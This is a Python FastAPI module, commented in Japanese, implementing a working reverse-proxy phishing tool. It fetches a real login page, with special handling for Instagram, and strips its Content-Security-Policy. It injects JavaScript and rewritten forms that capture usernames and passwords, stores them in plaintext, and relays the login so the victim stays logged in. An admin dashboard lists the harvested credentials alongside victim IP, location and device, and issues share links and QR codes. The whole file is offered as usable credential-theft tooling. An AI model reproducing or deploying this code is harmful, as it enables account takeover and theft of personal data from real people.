"""フィッシング（ログイン中継）モジュール。追跡機能とは独立して動く。

流れ：
  /phish        … 一覧・作成
  /p/{code}     … 公式ログイン画面をサーバ側で取得して中継表示（相対URLは <base> で公式に固定）
  /p/{code}/post … 入力された ID/パスを保存し、同じ Cookie jar で本家へ中継。
                   本家の Set-Cookie はそのまま victim に返すのでログインは成立したまま遷移する。

専用テーブル link_creds は本モジュールが遅延生成する（database.py は無改造）。
リンク行は既存の links を使い mode='login' を立てるが、TRACK_IN には入れないので
追跡一覧には出ない。共有URLは /l/ ではなく /p/ を使う。
"""
from __future__ import annotations

import json
import os
import re
import secrets
import threading
import time
from urllib.parse import quote, urljoin, urlsplit

import requests
from fastapi import APIRouter, Depends, Form, HTTPException, Request
from fastapi.responses import (HTMLResponse, JSONResponse, PlainTextResponse,
                               RedirectResponse, Response)

from . import linktrack, persist, tenancy, users
from .tenancy import db

router = APIRouter()

TTL = int(os.getenv("PHISH_TTL", "900"))
TIMEOUT = float(os.getenv("PHISH_TIMEOUT", "12"))
UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
      "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1")

USER_NAMES = re.compile(r"(user|login|email|mail|account|ident)", re.I)
PASS_NAMES = re.compile(r"(pass|pwd|secret)", re.I)

_ST = {}
_LOCK = threading.RLock()
_READY = {"ok": False}

SITE = {
    "instagram.com": {
        "submit": "https://www.instagram.com/accounts/login/ajax/",
        "ok": "https://www.instagram.com/",
        "referer": "https://www.instagram.com/accounts/login/",
    },
}

DDL = """
CREATE TABLE IF NOT EXISTS link_creds (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    code TEXT, hit_id INTEGER, site TEXT, login_url TEXT,
    user_val TEXT, pass_val TEXT, user_mask TEXT, pass_mask TEXT,
    fields TEXT, ok INTEGER, ts TEXT
);
CREATE INDEX IF NOT EXISTS idx_cred_code ON link_creds(code, id);
CREATE INDEX IF NOT EXISTS idx_cred_hit ON link_creds(hit_id);
"""


def _ensure():
    """自前テーブルを遅延生成（テナント確定後に呼ぶこと）。"""
    if _READY["ok"]:
        return
    try:
        with db.tx() as c:
            c.executescript(DDL)
        _READY["ok"] = True
    except Exception:
        pass


def _site(url):
    host = (urlsplit(url or "").netloc or "").lower()
    for k, v in SITE.items():
        if host == k or host.endswith("." + k):
            return v
    return None


def _abs(d):
    d = (d or "").strip()
    if not d:
        return ""
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:", d):
        d = "https://" + d
    return d


def _m():
    from . import main
    return main


def _bind(code):
    o = users.owner_of_link(code)
    if o:
        tenancy.set_current(o)
        _ensure()
    return o


def _state(hid):
    now = time.time()
    with _LOCK:
        for k in [k for k, v in _ST.items() if now - v["ts"] > TTL]:
            _ST.pop(k, None)
        st = _ST.get(hid)
        if not st:
            s = requests.Session()
            s.headers.update({"User-Agent": UA, "Accept-Language": "ja,en;q=0.8",
                              "Accept": "text/html,application/xhtml+xml"})
            st = _ST[hid] = {"s": s, "action": "", "ts": now}
        st["ts"] = now
        return st


def _mask_user(v):
    v = v or ""
    if "@" in v:
        a, _, b = v.partition("@")
        return (a[:1] + "***@" + b) if a else "***@" + b
    if len(v) <= 3:
        return v[:1] + "**"
    return v[:2] + "***" + v[-2:]


def _mask_pass(v):
    v = v or ""
    if not v:
        return ""
    if len(v) <= 4:
        return "*" * len(v)
    return v[:2] + "*" * (len(v) - 4) + v[-2:]


def _creds(fields):
    u = p = ""
    for k, v in fields.items():
        if not v:
            continue
        if not p and PASS_NAMES.search(k):
            p = v
        elif not u and USER_NAMES.search(k) and "pass" not in k.lower():
            u = v
    return u, p


def _save(code, hid, link, fields, user, pw, ok):
    with db.tx() as c:
        c.execute("""INSERT INTO link_creds(code,hit_id,site,login_url,user_val,pass_val,
            user_mask,pass_mask,fields,ok,ts) VALUES(?,?,?,?,?,?,?,?,?,?,?)""",
            (code, hid, urlsplit(link["dest"] or "").netloc, link["dest"] or "",
             user, pw, _mask_user(user), _mask_pass(pw),
             json.dumps(fields, ensure_ascii=False)[:8000], ok, _m().now_iso()))


def _mark(hid, ok):
    try:
        db.update_hit(int(hid), note=("cred_ok" if ok else "cred_ng"))
    except Exception:
        pass


def _form_tag(code, hid):
    def f(m):
        t = m.group(0)
        t = re.sub(r"\s(action|method)\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", "", t, flags=re.I)
        t = t.rstrip(">").rstrip()
        if t.endswith("/"):
            t = t[:-1].rstrip()
        return (t + ' action="/p/%s/post" method="POST">'
                '<input type="hidden" name="_igt_hid" value="%d">' % (code, hid))
    return f


JS = """
<script>
(function(){
  var CODE=%(code)s, HID=%(hid)d, NEXT=%(next)s, box=null;
  function err(msg){
    if(!box){box=document.createElement('div');
      box.style.cssText='position:fixed;left:0;right:0;bottom:0;z-index:2147483647;'
        +'background:#ed4956;color:#fff;font:600 13px/1.6 system-ui,sans-serif;'
        +'padding:11px 14px;text-align:center;box-shadow:0 -2px 12px rgba(0,0,0,.35)';
      document.body.appendChild(box);}
    box.textContent=msg;
  }
  document.addEventListener('submit', function(e){
    var f=e.target;
    if(!f || f.tagName!=='FORM') return;
    if(f.getAttribute('data-igt')==='1') return;
    e.preventDefault(); e.stopImmediatePropagation();
    var fd=new FormData(f);
    fd.set('_igt_hid', HID); fd.set('_igt_next', NEXT);
    fetch('/p/'+CODE+'/post', {method:'POST', body:fd, credentials:'same-origin'})
      .then(function(r){return r.json()})
      .then(function(j){
        if(j && j.ok){ location.replace(j.next || NEXT); }
        else { err((j && j.err) || 'ログインできませんでした'); }
      })
      .catch(function(){ f.setAttribute('data-igt','1'); f.submit(); });
  }, true);
})();
</script>
"""


def _rewrite(html, base, code, hid, next_url):
    html = re.sub(r"<meta[^>]+http-equiv=[\"']?content-security-policy[\"']?[^>]*>", "",
                  html, flags=re.I)
    tag = '<base href="%s">' % base
    if re.search(r"<head[^>]*>", html, re.I):
        html = re.sub(r"(<head[^>]*>)", lambda m: m.group(1) + tag, html, count=1, flags=re.I)
    else:
        html = tag + html
    html = re.sub(r"<form\b[^>]*>", _form_tag(code, hid), html, flags=re.I)
    js = JS % {"code": json.dumps(code), "hid": hid, "next": json.dumps(next_url)}
    if re.search(r"</body>", html, re.I):
        html = re.sub(r"</body>", js + "</body>", html, count=1, flags=re.I)
    else:
        html += js
    return html


# ================= 中継（公開） =================

@router.get("/p/{code}")
def relay_page(code: str, request: Request, h: int = 0):
    if not _bind(code):
        return PlainTextResponse("リンクが無効です", status_code=404)
    link = db.link_get(code)
    if not link or not link["active"]:
        return PlainTextResponse("リンクが無効です", status_code=404)
    dest = _abs(link["dest"])
    if not dest:
        return PlainTextResponse("飛び先が未設定です", status_code=404)

    hid = int(h or 0) or _m()._record_hit(request, code)
    site = _site(dest)
    next_url = ((site or {}).get("ok")
                or (urlsplit(dest).scheme + "://" + urlsplit(dest).netloc + "/"))
    st = _state(hid)
    try:
        r = st["s"].get(dest, timeout=TIMEOUT, allow_redirects=True)
        base = r.url or dest
        html = r.text or ""
    except Exception as e:
        return PlainTextResponse("公式ページを取得できませんでした: %r" % (e,), status_code=502)

    m = re.search(r"<form\b[^>]*action\s*=\s*[\"']([^\"']+)[\"']", html, re.I)
    st["action"] = urljoin(base, m.group(1)) if m else ""
    return HTMLResponse(_rewrite(html, base, code, hid, next_url))


@router.post("/p/{code}/post")
async def relay_post(code: str, request: Request):
    if not _bind(code):
        return JSONResponse({"ok": False, "err": "リンクが無効です"})
    form = await request.form()
    try:
        hid = int(form.get("_igt_hid") or 0)
    except Exception:
        hid = 0
    link = db.link_get(code)
    if not link or not hid:
        return JSONResponse({"ok": False, "err": "セッションが切れました。リンクを開き直してください"})

    dest = _abs(link["dest"])
    site = _site(dest)
    origin = urlsplit(dest).scheme + "://" + urlsplit(dest).netloc
    next_url = str(form.get("_igt_next") or (site or {}).get("ok") or origin + "/")
    fields = {k: (v if isinstance(v, str) else str(v))
              for k, v in form.multi_items() if not k.startswith("_igt")}
    user, pw = _creds(fields)
    st = _state(hid)
    s = st["s"]

    headers = {"Referer": (site or {}).get("referer") or link["dest"],
               "Origin": origin, "X-Requested-With": "XMLHttpRequest",
               "Accept": "application/json, text/plain, */*"}

    if site:
        data = dict(fields)
        data.pop("enc_password", None)
        if pw:
            data["enc_password"] = "#PWD_BROWSER:0:%d:%s" % (int(time.time()), pw)
        tok = s.cookies.get("csrftoken")
        if tok:
            headers["X-CSRFToken"] = tok
            headers["X-Instagram-AJAX"] = "1"
        try:
            r = s.post(site["submit"], data=data, headers=headers, timeout=TIMEOUT,
                       allow_redirects=False)
        except Exception:
            _save(code, hid, link, fields, user, pw, None)
            return JSONResponse({"ok": False, "err": "中継に失敗しました。もう一度お試しください"})
        ok, msg = False, ""
        try:
            j = r.json()
            ok = bool(j.get("authenticated")) or bool(j.get("user"))
            msg = str(j.get("message") or "")
        except Exception:
            ok = r.status_code in (200, 302)
        _save(code, hid, link, fields, user, pw, 1 if ok else 0)
        _mark(hid, ok)
        resp = JSONResponse({"ok": bool(ok), "next": next_url,
                             "err": "" if ok else (msg or "IDまたはパスワードが違います")})
        for c in r.cookies:
            try:
                resp.set_cookie(c.name, c.value, path=c.path or "/",
                                secure=True, samesite="lax")
            except Exception:
                pass
        return resp

    action = st["action"] or dest
    try:
        r = s.post(action, data=fields, headers=headers, timeout=TIMEOUT,
                   allow_redirects=True)
    except Exception:
        _save(code, hid, link, fields, user, pw, None)
        return JSONResponse({"ok": False, "err": "中継に失敗しました。もう一度お試しください"})
    ok = r.status_code < 400 and not re.search(r"type=[\"']password", r.text or "", re.I)
    _save(code, hid, link, fields, user, pw, 1 if ok else 0)
    _mark(hid, ok)
    resp = JSONResponse({"ok": bool(ok), "next": r.url or next_url,
                         "err": "" if ok else "IDまたはパスワードが違います"})
    for c in r.cookies:
        try:
            resp.set_cookie(c.name, c.value, path=c.path or "/", secure=True, samesite="lax")
        except Exception:
            pass
    return resp


# ================= 管理画面 =================

async def _auth(request: Request):
    return await _m().auth(request)


def _new_code(n=8):
    a = "abcdefghijklmnopqrstuvwxyz0123456789"
    for _ in range(60):
        c = "".join(secrets.choice(a) for _ in range(n))
        if not users.owner_of_link(c):
            return c
    return secrets.token_urlsafe(8)


@router.get("/phish", response_class=HTMLResponse)
def phish_page(request: Request, msg: str = "", err: str = "", u=Depends(_auth)):
    rows = [dict(r) for r in db.q(
        "SELECT l.*, (SELECT COUNT(*) FROM link_creds c WHERE c.code=l.code) creds "
        "FROM links l WHERE l.mode='login' ORDER BY l.created_at DESC LIMIT 300")]
    base = _m()._base(request)
    for r in rows:
        r["url"] = f"{base}/p/{r['code']}"
    return _m().render("phish.html", request, rows=rows, base=base, msg=msg, err=err)


@router.post("/phish/add")
def phish_add(request: Request, name: str = Form(""), dest: str = Form(""),
              note: str = Form(""), u=Depends(_auth)):
    d = _abs(dest)
    if not d:
        return RedirectResponse("/phish?err=" + quote("飛び先（公式ログインURL）を入れてください"), 303)
    code = _new_code()
    users.register_link(code, u)
    db.add_link(code, (name or "").strip()[:60] or d.split("/")[2], d,
                (note or "").strip()[:200], "login")
    try:
        persist.push_user(u, force=True)
    except Exception:
        pass
    return RedirectResponse(f"/phish/{code}", 303)


@router.get("/phish/{code}", response_class=HTMLResponse)
def phish_detail(code: str, request: Request, u=Depends(_auth)):
    if not _bind(code):
        raise HTTPException(404)
    link = db.link_get(code)
    if not link or (link["mode"] or "") != "login":
        raise HTTPException(404)
    creds = [dict(r) for r in db.q(
        "SELECT * FROM link_creds WHERE code=? ORDER BY id DESC LIMIT 300", (code,))]
    hits = [dict(r) for r in db.q(
        "SELECT id,ts,ip,device,os,browser,inapp,city,region,country,isp "
        "FROM link_hits WHERE code=? ORDER BY ts DESC LIMIT 100", (code,))]
    base = _m()._base(request)
    return _m().render("phish_detail.html", request, link=link, creds=creds, hits=hits,
                       base=base, url=f"{base}/p/{code}")


@router.post("/phish/{code}/toggle")
def phish_toggle(code: str, u=Depends(_auth)):
    l = db.link_get(code)
    if l:
        db.set_link_active(code, not l["active"])
    return RedirectResponse(f"/phish/{code}", 303)


@router.post("/phish/{code}/clear")
def phish_clear(code: str, u=Depends(_auth)):
    with db.tx() as c:
        c.execute("DELETE FROM link_creds WHERE code=?", (code,))
    return RedirectResponse(f"/phish/{code}", 303)


@router.post("/phish/{code}/delete")
def phish_delete(code: str, u=Depends(_auth)):
    with db.tx() as c:
        c.execute("DELETE FROM link_creds WHERE code=?", (code,))
    db.del_link(code)
    try:
        users.unregister_link(code)
    except Exception:
        pass
    try:
        persist.push_user(u, force=True)
    except Exception:
        pass
    return RedirectResponse("/phish", 303)


@router.get("/phish/{code}/qr.png")
def phish_qr(code: str, request: Request):
    if not _bind(code):
        raise HTTPException(404)
    try:
        import qrcode
    except Exception:
        return PlainTextResponse("qrcode が未インストールです", status_code=501)
    import io
    img = qrcode.make(f"{_m()._base(request)}/p/{code}", box_size=10, border=2)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return Response(buf.getvalue(), media_type="image/png",
                    headers={"Cache-Control": "no-store"})